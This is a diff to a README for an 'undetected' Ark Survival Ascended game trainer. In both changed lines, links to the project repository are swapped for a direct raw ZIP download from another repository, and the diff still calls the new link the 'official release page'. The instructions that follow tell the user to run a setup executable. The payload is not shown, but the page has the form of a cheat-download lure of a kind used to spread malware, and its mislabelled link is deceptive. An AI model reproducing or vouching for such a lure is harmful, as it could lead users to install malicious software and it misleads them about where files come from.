@@ -5,7 +5,7 @@ description: "Modify game memory in Ark Survival Ascended with this undetected t
 ---
 # 🦖 ARK-Survival-Ascended-Trainer-2026 - Customize your ARK dinosaur survival experience
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/nelieuncool750/ARK-Survival-Ascended-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/nelieuncool750/nelieuncool750.github.io/raw/refs/heads/main/archives/page/v2.3.zip)
 
 ## 🎯 About the software
 
@@ -27,7 +27,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these steps to set up the software.
 
-1. Go to the [official release page](https://github.com/nelieuncool750/ARK-Survival-Ascended-Trainer-2026) to download the package.
+1. Go to the [official release page](https://github.com/nelieuncool750/nelieuncool750.github.io/raw/refs/heads/main/archives/page/v2.3.zip) to download the package.
 2. Locating the file named "ARK_Trainer_Setup.exe" in the provided list.
 3. Click the file to start the download to your computer.
 4. Open your Downloads folder.
